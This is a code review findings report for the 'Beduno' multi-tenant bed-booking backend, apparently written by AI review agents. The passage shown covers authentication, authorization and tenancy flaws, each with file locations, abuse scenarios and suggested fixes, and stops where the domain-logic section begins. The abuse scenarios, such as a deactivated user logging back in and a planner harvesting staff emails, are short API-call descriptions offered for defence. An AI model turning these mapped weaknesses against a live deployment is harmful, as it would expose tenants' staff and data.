# Beduno Backend - Code Review Findings (2026-09-14)

> Reviewed at commit `164e961` on `main`. Line numbers in every `Location` refer to that commit.
> Produced by three parallel read-only review agents (Claude Fable 5.1), one per area, merged and
> cross-checked by an orchestrating session. No source file was modified during the review; one
> throw-away integration test was executed to confirm DOM-01 and then deleted.

## How to use this document

This file is the work queue for whoever addresses the findings. Each finding has a stable id
(`SEC-NN`, `DOM-NN`, `INF-NN`), a severity, exact locations, a concrete failure scenario and a
suggested fix. Work through the **Priority order** below; when a fix lands, add a `- **Status:**`
line under the finding (`fixed in <sha>`, `accepted risk: <why>`, `not a bug: <why>`) rather than
deleting it, so the file stays a ledger.

Ground rules for the fixing session (from `CLAUDE.md` / `AGENTS.md`, restated because several
findings tempt you to break them):

- Never edit an existing Flyway migration. Schema fixes are new `V15+__*.sql` files.
- Every new repository query filters by `agencyId`; the only sanctioned exceptions are listed in
  `CLAUDE.md`. If a fix adds one, record it there and in `AGENTS.md`.
- Every fix ships with a regression test (JUnit 5 + AssertJ + Testcontainers, `should{X}_when{Y}`).
  Several findings name the test to add. Run `./gradlew build` (tests + checkstyle) before each commit.
- Commit format `[<model-id>] <type>(<scope>): <description>`, no `Co-Authored-By` trailer.
- Read the **What looked good** section of each area before touching that area; those are
  behaviours that must not regress (e.g. half-open date ranges, hard-before-soft constraint
  reporting, 404-not-403 for cross-agency ids).

## Totals

| Area | Findings | HIGH | MEDIUM | LOW |
|------|---------:|-----:|-------:|----:|
| Security, auth, multi-tenancy, config (`SEC`) | 14 | 2 | 6 | 6 |
| Domain logic (`DOM`) | 20 | 6 | 11 | 3 |
| Data model, build, deployment, tests, docs (`INF`) | 20 | 3 | 14 | 3 |
| **Total** | **54** | **11** | **31** | **12** |

No CRITICAL findings (no cross-tenant data exposure, no auth bypass, no secret leak was found).
All three reviewers independently confirmed that tenant isolation via `agencyId` holds on every
request path today; the remaining tenancy items are hygiene (SEC-07 / INF-04 / DOM-18).

## Overlaps: address once, close several ids

Three reviewers looked at adjacent code from different angles and filed the same root cause more
than once. Fix the group, then mark every id in it.

| Group | Root cause | Ids | One fix |
|-------|-----------|-----|---------|
| G1 | Unscoped `findAllById` in `ExportService` / `OccupancyService.loadWorkers` | SEC-07, INF-04, DOM-18 | Add `BedRepository.findAllByAgencyIdAndIdIn`, use the existing worker equivalent, drop the `loadWorkers` exception from `CLAUDE.md`/`AGENTS.md`. |
| G2 | No `@ExceptionHandler` for `DataIntegrityViolationException` / `ObjectOptimisticLockingFailureException`; DB constraints reached from user input surface as 500 | SEC-06, INF-05, DOM-05, DOM-20 (`internalId`), DOM-02 (optimistic-lock part), DOM-01 (symptom) | Add both handlers → 409 with message codes in all six bundles; add the missing `@Size`/`@AssertTrue` validations so the handlers are a backstop, not the primary path. |
| G3 | `logback-spring.xml` "JSON" pattern is not JSON on exceptions | SEC-12, INF-20 | `logstash-logback-encoder` or `%nopex` + escaped `%ex` field. |
| G4 | `PLANNED → EXPECTED_TODAY` sweep: exact-date match, JVM-default zone, no startup catch-up, no audit, no test | DOM-04, INF-06, INF-08, SEC-13, DOM-17 | Catch-up query (`dateFrom <= :date`), `Clock` bean + `beduno.time-zone`, run once on `ApplicationReadyEvent`, audit each transition, `StaySchedulerIntegrationTest`. |
| G5 | Login/refresh happy path and inactive-user path untested | SEC-01, SEC-08, INF-02 | Fix SEC-01, then the tests named in SEC-08/INF-02 cover both. |
| G6 | Property scoping not enforced on stays/occupancy; test plan says Phase 2 "complete" | SEC-02, INF-16, SEC-03 (role matrix) | Roadmap slice S-08; decide the role matrix first (SEC-03), then enforce, then flip the trip-wire tests and correct `test-plan.md`. |
| G7 | Tenant-isolation list tests assert nothing | INF-07, DOM "also noted" | Add `doesNotContain` assertions in the two named tests. |
| G8 | Docs describe pre-V9/V13/pre-Users code | INF-14, INF-15, INF-17, SEC-03 (README role table), SEC-14(f) | One reconciliation pass against `openapi.yaml` and the controllers. |

## Priority order

Suggested sequence for the fixing session: cheapest high-impact items first, then the larger
design changes, then tests and docs. Effort is a rough size for a single focused change.

| # | Id(s) | Severity | Effort | Why now |
|--:|-------|----------|--------|---------|
| 1 | DOM-01 | HIGH | S | Verified: open-ended stays return 500 on every request. Pure query fix + test. |
| 2 | SEC-01 (+SEC-09) | HIGH | S | Deactivated users can still log in and refresh indefinitely. Two `if`s + tests. |
| 3 | G2: DOM-05, SEC-06, INF-05, DOM-20 | HIGH/MED | S | Closes a whole class of 500s (date order, `language`, `internalId`, unique races, optimistic lock). |
| 4 | DOM-03 | HIGH | S | Check-in with `{}` silently moves the worker to a different bed than planned. |
| 5 | DOM-06 | HIGH | S | Room/property mismatch makes a stay invisible to every occupancy view; repo method already exists. |
| 6 | DOM-10, DOM-11, DOM-15, DOM-16 | MED | S | Each is a few lines: audit snapshot order, same-room auto-move, inspection `toMap` crash, unbounded `count`. |
| 7 | G4: DOM-04, INF-06, INF-08, SEC-13, DOM-17 | HIGH | M | Same-day plans and any missed 06:00 run leave stays un-check-in-able; container runs in UTC. |
| 8 | DOM-08, DOM-09, DOM-14 | MED | M | Overstays vanish from occupancy and free the bed; exception report cannot see bed-level conflicts; deleting a worker orphans beds. |
| 9 | DOM-07, DOM-12 | MED | M | Bulk assign / CSV import: deferred-flush failures blame the wrong row and 500 the whole batch. Decide the per-item vs all-or-nothing contract first. |
| 10 | INF-01, INF-11, INF-12 | HIGH/MED | S–M | Deploy safety: snapshot before every roll, a way to refresh on-box deploy files, refuse untested builds. |
| 11 | DOM-02 | HIGH | M–L | Concurrency: exclusion constraint (new migration) or pessimistic locks; the only remaining path to a double booking once 1–8 are done. |
| 12 | G6: SEC-02, SEC-03, INF-16 | HIGH | L | Property scoping enforcement is roadmap slice S-08; decide the role matrix, then implement as one change. |
| 13 | SEC-04, SEC-05, SEC-10, SEC-11, DOM-13 | MED/LOW | S–M | Audit-log PII to planners, refresh-token revocation, login timing, runner ordering, CSV formula injection. |
| 14 | INF-03, INF-18 | HIGH/LOW | M | Spring Boot 3.4.4 bump + dependency scanning; pin images. Needs a full test run and a prod roll. |
| 15 | G1, G3, G7, INF-09, INF-10, INF-13, INF-19 | MED/LOW | S–M | Tenancy hygiene, logging, test gaps (audit content, exports, stay filters, scheduler), rollback floor doc, test-container sharing. |
| 16 | G8 docs, SEC-14, DOM-19 | MED/LOW | M | Doc reconciliation and dead-code cleanup last, so the docs describe the fixed code. |

## Accepted risks and known decisions (not findings)

- `SeedRunner` creates a demo tenant with a known password and `BEDUNO_SEED_ENABLED=true` in prod
  SSM: explicit decision on 2026-09-14, safe alongside real tenants because its idempotency guard is
  the demo admin's globally unique email.
- Global unique `users.email` (V8) means `POST /users` leaks a one-bit "email exists in some
  agency" signal to admins. Documented design; see SEC "Also noted".
- `WorkerResponse` returns full PII to `FRONT_DESK`; a product decision, flagged under DOM "Also noted".

---

## Area: Security, auth, multi-tenancy, config

### Findings

#### SEC-01 — Deactivated users can still log in, refresh, and keep access indefinitely
- **Severity:** HIGH
- **Category:** authorization
- **Location:** `src/main/java/com/beduno/auth/AuthService.java:29-34` (login)
  `src/main/java/com/beduno/auth/AuthService.java:49-50` (refresh)
  `src/main/java/com/beduno/common/security/TenantFilter.java:39-40`
  `src/main/java/com/beduno/user/UserService.java:110-129` (deactivate)
- **What:** `UserStatus.INACTIVE` is never consulted on any authentication path. Login checks only email + password, refresh checks only signature + type, and the filter is stateless, so `DELETE /users/{id}` ("Sets status to INACTIVE") does not revoke anything.
- **Evidence:**
  ```java
  var user = userRepository.findByEmail(request.email())
          .orElseThrow(() -> new UnauthorizedException("error.auth.invalid_credentials"));
  if (!passwordEncoder.matches(request.password(), user.getPasswordHash())) { ... }
  ```
  A grep for `UserStatus`/`getStatus()` across `auth/` and `common/security/` returns nothing.
- **Failure scenario:** Admin deactivates a former front-desk employee → that person POSTs `/api/v1/auth/login` with their old email/password → 200 with fresh tokens. Even without re-login, their existing refresh token keeps minting new 7-day refresh tokens (`refresh()` loads the user by id and re-issues), so access never expires.
- **Suggested fix:** In `AuthService.login` throw `UnauthorizedException("error.auth.invalid_credentials")` when `user.getStatus() != UserStatus.ACTIVE` (same code as bad password, so no enumeration), and in `refresh` throw `error.auth.invalid_refresh_token` for the same condition. That bounds a deactivated user's access to the remaining life of one access token (≤ 1 h). Pair with SEC-05 for immediate revocation. Add `shouldReturnUnauthorized_whenUserIsInactive` for both endpoints.
- **Confidence:** HIGH

#### SEC-02 — Property scoping (`assignedPropertyIds`) is not enforced on stays, occupancy, inspection, or exports
- **Severity:** HIGH
- **Category:** authorization
- **Location:** `src/main/java/com/beduno/stay/StayController.java:79-150` (every endpoint)
  `src/main/java/com/beduno/stay/StayService.java` (no `CurrentUser`/`hasPropertyAccess` reference)
  `src/main/java/com/beduno/occupancy/OccupancyController.java:39-107`
  `src/main/java/com/beduno/occupancy/ExportService.java`
- **What:** `CurrentUser.hasPropertyAccess` is invoked in exactly three places (`PropertyController.java:72`, `RoomController.java:93`, `BedController.java:108`). All stay lifecycle operations, occupancy views, inspection and CSV exports are agency-wide for `PROPERTY_ADMIN` and `FRONT_DESK`.
- **Evidence:** `grep -rn hasPropertyAccess src/main/java` → three hits, none in `stay/` or `occupancy/`. `StayService.checkIn` loads the stay by `(id, agencyId)` only.
- **Failure scenario:** FRONT_DESK token with `properties=[A]` → `POST /api/v1/stays/{stayAtPropertyB}/check-in` → 200. Same for check-out, move, no-show, `GET /properties/B/inspection`, `GET /properties/B/occupancy/export`.
- **Suggested fix:** This is a documented, roadmapped gap (README.md:374-380, docs/api-specification.md:135-142, roadmap slice S-08 `enforce-property-scoping`, trip-wire tests in `StayGuardIntegrationTest`). Filed so the merged report is complete; fix it as S-08, not piecemeal: add a `PropertyAccessGuard.require(UUID propertyId)` in `common/security` that reads the principal from `SecurityContextHolder` and throws `ForbiddenException("error.property.access_denied")` for PROPERTY_ADMIN/FRONT_DESK outside their list; call it in `StayService` after `getStayOrThrow` (and on `request.propertyId()` for create/bulk-assign, on the target room's property for move), and at the top of every `OccupancyService`/`ExportService` method. Flip the trip-wire tests to expect 403.
- **Confidence:** HIGH

#### SEC-03 — Role sets on check-in/out/move/no-show and inspection deny AGENCY_ADMIN, contradicting the README and the bulk-checkout rule
- **Severity:** MEDIUM
- **Category:** authorization
- **Location:** `src/main/java/com/beduno/stay/StayController.java:80,88,96,105` (`hasAnyRole('PROPERTY_ADMIN', 'FRONT_DESK')`)
  `src/main/java/com/beduno/stay/StayController.java:147` (bulk-checkout allows AGENCY_ADMIN/PLANNER)
  `src/main/java/com/beduno/occupancy/OccupancyController.java:58,67` (`hasRole('PROPERTY_ADMIN')`)
  `README.md:369` ("AGENCY_ADMIN | Full access across the agency")
- **What:** The README's role table promises full access to AGENCY_ADMIN, but the single-stay operational endpoints and both inspection endpoints return 403 to it. Meanwhile `POST /stays/bulk-checkout` permits AGENCY_ADMIN and AGENCY_PLANNER, so a single check-out is forbidden to a role that may bulk-check-out the same stay.
- **Evidence:** `@PreAuthorize("hasAnyRole('PROPERTY_ADMIN', 'FRONT_DESK')")` on `checkOut` vs `@PreAuthorize("hasAnyRole('AGENCY_ADMIN', 'AGENCY_PLANNER', 'PROPERTY_ADMIN', 'FRONT_DESK')")` on `bulkCheckout`.
- **Failure scenario:** The bootstrap AGENCY_ADMIN (the only account on a fresh deployment) cannot check anyone in or out until they create a FRONT_DESK user; a planner who cannot `POST /stays/{id}/check-out` can `POST /stays/bulk-checkout` with `stayIds=[id]`.
- **Suggested fix:** Decide the matrix once. Most likely: add `AGENCY_ADMIN` to check-in/no-show/check-out/move and to the two inspection endpoints, and align `bulk-checkout` with `check-out` (same role set). Otherwise fix README.md:369 and the "PROPERTY_ADMIN only" notes to state the exclusion explicitly. Add one 403/200 assertion per changed endpoint.
- **Confidence:** HIGH that code and docs contradict; MEDIUM on which side is intended (no role matrix exists in `docs/api-specification.md`).

#### SEC-04 — AGENCY_PLANNER can read every user's email and role through the audit log, although `/users` is admin-only
- **Severity:** MEDIUM
- **Category:** authorization
- **Location:** `src/main/java/com/beduno/audit/AuditController.java:33`
  `src/main/java/com/beduno/user/UserService.java:147-155` (snapshot includes `email`)
  `src/main/java/com/beduno/user/UserController.java:30-34` (rationale for admin-only)
  `src/main/java/com/beduno/config/SeedRunner.java:261-263`
- **What:** `UserController` is gated to AGENCY_ADMIN precisely because it "exposes email addresses and role assignments for every account", but every USER audit event carries `email`, `firstName`, `lastName`, `role`, `status` in `previousState`/`newState`, and `GET /api/v1/audit` is open to AGENCY_PLANNER.
- **Evidence:**
  ```java
  @PreAuthorize("hasAnyRole('AGENCY_ADMIN', 'AGENCY_PLANNER')")   // AuditController
  map.put("email", user.getEmail()); ... map.put("role", user.getRole().name()); // UserService.snapshot
  ```
- **Failure scenario:** PLANNER → `GET /api/v1/audit?entityType=USER&size=1000` → full roster of staff emails and roles, including admins.
- **Suggested fix:** In `AuditService.findAll`, when the caller's role is not AGENCY_ADMIN, exclude `AuditEntityType.USER` (add an `excludeEntityType` parameter to `AuditRepository.findAllWithFilters`, or reject `entityType=USER` with 403 and filter it out of unfiltered queries). Add a test that a PLANNER never receives a USER event.
- **Confidence:** HIGH

#### SEC-05 — Refresh tokens are never rotated or revocable
- **Severity:** MEDIUM
- **Category:** auth-token
- **Location:** `src/main/java/com/beduno/auth/AuthService.java:40-53`
  `src/main/java/com/beduno/auth/JwtTokenProvider.java:51-62`
- **What:** A refresh issues a new pair but the presented refresh token stays valid until its own 7-day expiry; there is no `jti`, no token version, and no logout endpoint, so the only revocation lever is rotating `JWT_SECRET` (which logs out every tenant).
- **Evidence:** `refresh()` = `validateToken` + `isRefreshToken` + `findById` + `buildAuthResponse`; nothing is persisted or compared.
- **Failure scenario:** A refresh token leaks from a device → attacker keeps a live session for 7 days no matter what the user or admin does; combined with SEC-01 the session is permanent.
- **Suggested fix:** New migration adding `users.token_version INT NOT NULL DEFAULT 0`; include `tv` in refresh (and optionally access) claims; in `refresh()` reject when `claim.tv != user.getTokenVersion()`; increment it in `UserService.deactivate`, on any future password change/logout. Minimal state, no token table.
- **Confidence:** HIGH

#### SEC-06 — Creating or updating a user without `language` produces a 500 (NOT NULL violation; no `DataIntegrityViolationException` handler)
- **Severity:** MEDIUM
- **Category:** error-handling
- **Location:** `src/main/java/com/beduno/user/dto/CreateUserRequest.java:18`
  `src/main/java/com/beduno/user/dto/UpdateUserRequest.java:18`
  `src/main/java/com/beduno/user/UserMapper.java:25,34` (generated `UserMapperImpl` does `user.setLanguage(request.language())` unconditionally)
  `src/main/java/com/beduno/user/User.java:40-41` (`language` NOT NULL)
  `src/main/java/com/beduno/common/exception/GlobalExceptionHandler.java:123-128`
- **What:** `language` is optional in both DTOs (`@Size` only), MapStruct overwrites the entity default `"PL"` with `null`, Postgres rejects the insert/update, and the handler maps `DataIntegrityViolationException` to `INTERNAL_ERROR`.
- **Evidence:** `build/generated/.../UserMapperImpl.java` line 32: `user.setLanguage( request.language() );` and line 49 (updateEntity) the same; `V2__create_users.sql`: `language VARCHAR(5) NOT NULL DEFAULT 'PL'`.
- **Failure scenario:** `POST /api/v1/users {"email":..,"password":..,"firstName":..,"lastName":..,"role":"FRONT_DESK"}` → 500 with a stack trace in the log; `PUT` without `language` nulls out an existing user's language → 500.
- **Suggested fix:** `@NotBlank` on `language` in both DTOs (or default in `UserService.create`/`update`). Independently, add an `@ExceptionHandler(DataIntegrityViolationException.class)` → 409 `CONFLICT`/`error.conflict` in `GlobalExceptionHandler` as the backstop for unique-constraint races (`uq_users_email`, room number, bed label) that the pre-checks cannot close.
- **Confidence:** HIGH

#### SEC-07 — Unsanctioned unscoped `findAllById` in `ExportService`; the sanctioned `OccupancyService.loadWorkers` exception is now unnecessary
- **Severity:** MEDIUM
- **Category:** tenant-isolation
- **Location:** `src/main/java/com/beduno/occupancy/ExportService.java:90`
  `src/main/java/com/beduno/occupancy/OccupancyService.java:189-196` (`agencyId` parameter is accepted and ignored)
  `src/main/java/com/beduno/worker/WorkerRepository.java:83` (`findAllByAgencyIdAndIdIn` already exists)
  `src/main/java/com/beduno/auth/AuthService.java:49,56` (unscoped `findById`, undocumented)
- **What:** `bedRepository.findAllById(distinctIds)` is the exact pattern CLAUDE.md says not to reuse and is not on the sanctioned list; it is safe only because the ids come from the agency-filtered `findArrivals`. `loadWorkers` still uses `findAllById` although a scoped query exists and the agency id is already in hand.
- **Evidence:**
  ```java
  return bedRepository.findAllById(distinctIds).stream()          // ExportService
  private Map<UUID, Worker> loadWorkers(List<Stay> stays, UUID agencyId) {
      ...
      return workerRepository.findAllById(workerIds).stream()      // agencyId unused
  ```
- **Failure scenario:** No exposure today. A future refactor that feeds `bedLabelById` ids from a request body (e.g. an export filter) would silently return other agencies' bed labels.
- **Suggested fix:** Add `List<Bed> findAllByAgencyIdAndIdIn(UUID agencyId, Collection<UUID> ids)` to `BedRepository` and use it with `TenantContext.requireAgencyId()`; switch `loadWorkers` to `workerRepository.findAllByAgencyIdAndIdIn(agencyId, workerIds)`; remove the `OccupancyService.loadWorkers` entry from CLAUDE.md/AGENTS.md. Add `AuthService.refresh`/`getCurrentUser` to the sanctioned list (they run before/without a tenant context) or scope `/me` via `findByIdAndAgencyId(userId, currentUser.agencyId())`.
- **Confidence:** HIGH

#### SEC-08 — Core auth flow and the user-guard edge cases have no integration coverage
- **Severity:** MEDIUM
- **Category:** test-gap
- **Location:** `src/test/java/com/beduno/auth/AuthIntegrationTest.java:20-42` (Login: only unknown user + blank fields)
  `src/test/java/com/beduno/auth/AuthIntegrationTest.java:44-90` (Refresh: only failure cases)
  `src/test/java/com/beduno/auth/JwtTokenProviderTest.java:101-118` (no expired/tampered token)
  `src/test/java/com/beduno/user/UserIntegrationTest.java:141-180` (Update)
  (no audit test class; only `RoomSortIntegrationTest.java:82-117` touches `/api/v1/audit`)
- **What:** Nothing asserts that a correct password logs in, that a wrong password is 401, that a valid refresh token yields a new pair, that an expired or foreign-key-signed token is 401, that changing the last admin's role is 409, that `PUT`/`DELETE /users/{id}` across agencies is 404, or that `GET /audit` is 403 for FRONT_DESK and tenant-scoped.
- **Evidence:** `grep -rn 'invalid_credentials\|wrong.?password\|Expired' src/test/java` → only the unknown-user case in `AuthIntegrationTest`.
- **Failure scenario:** SEC-01, SEC-05, SEC-09 all regress silently; a refactor of `AuthService.login` that breaks successful login passes CI.
- **Suggested fix:** Add to `AuthIntegrationTest`: `shouldIssueTokens_whenCredentialsAreValid` (insert a user with `passwordEncoder.encode`), `shouldReturnUnauthorized_whenPasswordIsWrong`, `shouldIssueNewPair_whenRefreshTokenIsValid`, `shouldReturnUnauthorized_whenUserIsInactive` (login and refresh), `shouldReturnUnauthorized_whenAccessTokenIsExpired` (set `accessTokenExpirationMs=-1000` on a local `JwtConfig`), `shouldReturnUnauthorized_whenTokenSignedWithOtherKey`. Add to `UserIntegrationTest`: last-admin role change → 409, self status INACTIVE via PUT, cross-agency PUT/DELETE → 404. Add `AuditIntegrationTest` with role gating and cross-agency isolation.
- **Confidence:** HIGH

#### SEC-09 — `UserService.update` bypasses the self-deactivation guard that `deactivate` enforces
- **Severity:** LOW
- **Category:** authorization
- **Location:** `src/main/java/com/beduno/user/UserService.java:83-103` vs `:111-116`
- **What:** `deactivate` throws `error.user.cannot_deactivate_self`; `update` accepts `status=INACTIVE` on the caller's own record with only the last-admin check.
- **Evidence:** `update` has no `user.getId().equals(currentUserId())` check; `deactivate` does.
- **Failure scenario:** Admin PUTs their own user with `status: INACTIVE` while another admin exists → 200; harmless today only because of SEC-01, and exactly the lock-out `deactivate` was written to prevent once SEC-01 is fixed.
- **Suggested fix:** In `update`, before mutation: `if (user.getId().equals(currentUserId()) && request.status() == UserStatus.INACTIVE) throw new ConflictException("error.user.cannot_deactivate_self");` plus a test.
- **Confidence:** HIGH

#### SEC-10 — Login timing reveals whether an email is registered
- **Severity:** LOW
- **Category:** auth-token
- **Location:** `src/main/java/com/beduno/auth/AuthService.java:29-34`
- **What:** Unknown email returns before any BCrypt work; known email costs a ~100 ms compare. The response body is identical but the latency is not.
- **Evidence:** `.orElseThrow(() -> new UnauthorizedException(...))` precedes `passwordEncoder.matches(...)`.
- **Failure scenario:** 10 req/min/IP is slow but sufficient to confirm a handful of guessed staff addresses per hour.
- **Suggested fix:** Keep a static `DUMMY_HASH = new BCryptPasswordEncoder().encode("x")` and always run `passwordEncoder.matches(request.password(), user.map(User::getPasswordHash).orElse(DUMMY_HASH))` before deciding.
- **Confidence:** HIGH

#### SEC-11 — Bootstrap and Seed runners have no defined order; seed-first silently skips bootstrap
- **Severity:** LOW
- **Category:** config
- **Location:** `src/main/java/com/beduno/config/BootstrapRunner.java:28-30,47-52`
  `src/main/java/com/beduno/config/SeedRunner.java:60-63,86-90`
  `deploy/docker-compose.prod.yml` (both `BOOTSTRAP_ENABLED` and `BEDUNO_SEED_ENABLED` exposed)
- **What:** Both are `ApplicationRunner`s without `@Order`. `BootstrapRunner` decides on `userRepository.count() > 0`; if `SeedRunner` runs first on an empty database, bootstrap sees four demo users and logs "nothing to do".
- **Evidence:** `if (existingUsers > 0) { log.info("Bootstrap requested but {} user(s) already exist; nothing to do. ..."); return; }`
- **Failure scenario:** Fresh prod deploy with both flags on → demo agency exists, real agency/admin never created, operator sees only an INFO line.
- **Suggested fix:** `@Order(1)` on `BootstrapRunner`, `@Order(2)` on `SeedRunner`; or make bootstrap's guard `userRepository.existsByEmail(properties.getAdminEmail())` so it is independent of seed data.
- **Confidence:** HIGH on the mechanism; MEDIUM on whether Spring happens to order them Bootstrap-first today (component-scan order is not a contract).

#### SEC-12 — Prod "structured JSON" log lines are not JSON whenever an exception or newline is logged
- **Severity:** LOW
- **Category:** config
- **Location:** `src/main/resources/logback-spring.xml:19`
- **What:** The pattern hand-builds JSON and only escapes `"` in `%msg`; it contains no `%ex`/`%nopex`, so logback appends the stack trace after the closing `}`; backslashes and embedded newlines are not escaped either.
- **Evidence:** `..."msg":"%replace(%msg){'\"','\\\"'}"}%n` with no throwable conversion word.
- **Failure scenario:** Every `log.error("Unhandled exception", ex)` from `GlobalExceptionHandler` yields a multi-line, unparseable record, i.e. exactly the lines an aggregator must not drop.
- **Suggested fix:** Use `logstash-logback-encoder`'s `LogstashEncoder` (adds MDC fields and a properly escaped `stack_trace`), or at minimum append `%nopex` and emit `"ex":"%replace(%ex){...}"` as its own escaped field.
- **Confidence:** HIGH

#### SEC-13 — Scheduler status transitions bypass the audit trail
- **Severity:** LOW
- **Category:** audit
- **Location:** `src/main/java/com/beduno/stay/StayService.java:278-284`
  `src/main/java/com/beduno/stay/StayScheduler.java:17-22`
- **What:** `transitionPlannedToExpectedToday` bulk-saves PLANNED → EXPECTED_TODAY with no `auditService.log`, while every other stay mutation is audited and the trail is described as covering "all changes".
- **Evidence:** `stays.forEach(s -> s.setStatus(StayStatus.EXPECTED_TODAY)); stayRepository.saveAll(stays);`
- **Failure scenario:** The next event on the stay (check-in) shows `previousState.status=EXPECTED_TODAY` with nothing recording when or why it left PLANNED.
- **Suggested fix:** Log one `UPDATED` event per stay with `actorUserId=null`, `reason="scheduler"`, using `s.getAgencyId()`; or document the exclusion in `docs/api-specification.md` §12 if intentional.
- **Confidence:** HIGH on the fact; MEDIUM on whether it is intended.

#### SEC-14 — Dead code, triple JWT verification per request, duplicated scoping helper, double filter registration
- **Severity:** LOW
- **Category:** code-quality
- **Location:** `src/main/java/com/beduno/config/SecurityConfig.java:79-82`
  `src/main/java/com/beduno/user/UserRepository.java:14`
  `src/main/java/com/beduno/common/security/TenantFilter.java:39-41` and `src/main/java/com/beduno/auth/JwtTokenProvider.java:27-29`
  `src/main/java/com/beduno/property/PropertyController.java:71-75`, `src/main/java/com/beduno/room/RoomController.java:92-96`, `src/main/java/com/beduno/bed/BedController.java:107-111`
  `src/main/java/com/beduno/config/SecurityConfig.java:69-70`
- **What:** (a) The `AuthenticationManager` bean is injected nowhere. (b) `findByAgencyIdAndEmail` is unused. (c) `validateToken`, `isRefreshToken`, `parseToken` each re-verify the HMAC and each rebuild the `SecretKey` from the string; three verifications per request. (d) `checkPropertyAccess` is copy-pasted in three controllers, one of them with inline FQCNs. (e) `RateLimitFilter`/`TenantFilter` are `@Component` `Filter`s and also added to the security chain, so Boot registers them a second time as plain servlet filters; `OncePerRequestFilter` masks it. (f) `AuthResponse.UserInfo` (`String[]`, `role` as `String`) and `UserResponse` (`List<UUID>`, `Role`) are two shapes for the same entity.
- **Evidence:** `grep -rn AuthenticationManager src/main/java` → only the bean definition; `grep -rn findByAgencyIdAndEmail src/main/java` → only the declaration.
- **Failure scenario:** None functional; maintenance cost and a small per-request CPU tax.
- **Suggested fix:** Delete the bean and the repository method; in `TenantFilter` parse once inside a `try/catch (JwtException | IllegalArgumentException)` and branch on the `type` claim; cache the `SecretKey` in a `JwtTokenProvider` field (`@PostConstruct` or constructor); move the check to `CurrentUser.requirePropertyAccess(UUID)` throwing `ForbiddenException`; add `FilterRegistrationBean` with `setEnabled(false)` for both filters; reuse `UserResponse` from `/auth/me`.
- **Confidence:** HIGH

Also noted (not filed):
- `POST /users` returns 409 `error.user.email_exists` for an email that exists in another agency: a one-bit cross-tenant existence probe, admin-only, and a direct consequence of the documented global-unique-email design (`V8__unique_user_email.sql`, `UserIntegrationTest.shouldRejectDuplicateEmail` exercises it deliberately).
- `assignedPropertyIds` on user create/update is not validated against the agency's properties (foreign or non-existent UUIDs are accepted); no exposure because every read is agency-scoped, but it is a data-integrity hole for S-08.
- There is no change-password or admin password-reset path; the only credential rotation is creating a new user.
- Role/property changes reach an existing access token only on its next refresh (≤ 1 h) - inherent to the stateless design; refresh does re-read the database.
- `WorkerService.java:202` logs `e.getMessage()` for failed CSV rows, which can echo cell values such as an unparseable date of birth.
- `docs/api-specification.md:124` still says CORS "allows any origin pattern"; `WebConfig` is an allowlist that defaults to empty in prod.
- `/auth/me` returns 404 for a valid token whose user row is gone, while `refresh` returns 401 for the same state; unreachable in practice since users are never hard-deleted.
- `Authorization: bearer ...` (lowercase scheme) is rejected by `TenantFilter.extractToken`; the scheme is case-insensitive per RFC 9110.

### What looked good
- Refresh/access token separation is enforced in both directions (`isRefreshToken` in `AuthService.refresh` and negated in `TenantFilter`) and pinned by two integration tests; refresh tokens carry only the subject, so role and property changes are re-read from the database on every refresh.
- `TenantContext` and MDC are cleared in `finally`; there is no `@Async`, and the only scheduled business job uses the one sanctioned cross-tenant query (`findPlannedArrivingOn`) and nothing else. All other repository methods carry an `agencyId` predicate, and every service resolves ids through `findByIdAndAgencyId`.
- JWT hygiene: `JwtConfig` fails startup on a blank or short secret, `application.yml` has no default outside `dev`, tests supply their own; jjwt 0.12 `verifyWith(SecretKey)` + `parseSignedClaims` rejects unsigned and algorithm-mismatched tokens.
- `RateLimitFilter` is well designed and well tested: keyed on `getRemoteAddr()` behind `forward-headers-strategy: native`, with Caddy overwriting `X-Forwarded-For` and CloudFront origin ranges declared as trusted proxies; bounded map with idle sweep and documented fail-open; decoded-path matching that defeats percent-encoding bypasses.
- Prod posture: STATELESS sessions, CSRF off for a bearer-only API, frame-deny/nosniff/HSTS, `/auth/me` deliberately outside `permitAll`, springdoc disabled and `public-api-docs=false`, actuator limited to `health,info`, CORS allowlist empty by default, only Caddy publishes ports, non-root container user, graceful shutdown budget matched to `stop_grace_period`.
- `GlobalExceptionHandler` extends `ResponseEntityExceptionHandler` so client mistakes are 4xx in the shared envelope; the catch-all never leaks internals; all codes are message keys guarded by `MessageBundleTest`.
- Audit writes join the caller's transaction (`@Transactional` REQUIRED), so a failed audit insert rolls back the business change - atomic, as CLAUDE.md intends; audit reads are always agency-scoped; every mutating service method in user/stay/worker/property/room/bed calls `auditService.log`.
- User lifecycle: deactivate-not-delete with a clear rationale, last-active-admin guard covering both role change and deactivation, `BootstrapRunner` failing startup on misconfiguration with a 12-character minimum and no email in logs, and the V8 global-unique-email migration documenting exactly why and how to revert.

### Coverage of this review
Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `common/model/`, `config/`, `user/`, `audit/`, `agency/`; `StayController`, `StayService`, `StayScheduler`, `OccupancyController`, `OccupancyService`, `ExportService`, `PropertyController`, `RoomController`, `BedController`; `application.yml`, `application-dev.yml`, `application-prod.yml`, `logback-spring.xml`, migrations V2/V6/V8, `deploy/Caddyfile`, `deploy/docker-compose.prod.yml`, `docker/Dockerfile`, the generated `UserMapperImpl`; tests `AuthIntegrationTest`, `JwtTokenProviderTest`, `RateLimitFilterTest`, `ErrorContractIntegrationTest`, `UserIntegrationTest`, `IntegrationTestBase`, `BootstrapRunnerIntegrationTest`, `SeedRunnerIntegrationTest`, `WebConfigCorsTest`, `BedunoApplicationSmokeTest`; README (env vars, endpoints, roles, CORS, health) and the relevant sections of `docs/api-specification.md`, `docs/architecture.md`, `context/foundation/{roadmap,test-plan}.md` and the `testing-authorization-boundary-closure` change. Grepped all of `src/main/java` for every controller mapping and `@PreAuthorize`, `TenantContext`, `hasPropertyAccess`, unscoped `findById`/`findAll`/`findAllById`/`deleteById`/`existsById`/`count`, `@Scheduled`/`@Async`, and every `log.*` call. Not verified by execution: that Spring Security's default `cors()` application lets preflights past `anyRequest().authenticated()` (the CORS test only exercises `CorsRegistry`), and the actual runtime ordering of the two `ApplicationRunner`s. `WorkerService`, `PropertyService`, `RoomService`, `BedService` were inspected only for their public mutating methods, audit calls and snapshot contents, not line by line. `context/foundation/lessons.md` does not exist.

---

## Area: Domain logic (stay, constraint engine, occupancy, bed/room/property/worker)

### Findings

#### DOM-01 — Open-ended stays (`dateTo = null`) cannot be created at all: `LocalDate.MAX` is bound as an out-of-range date and every request ends in 500
- **Severity:** HIGH
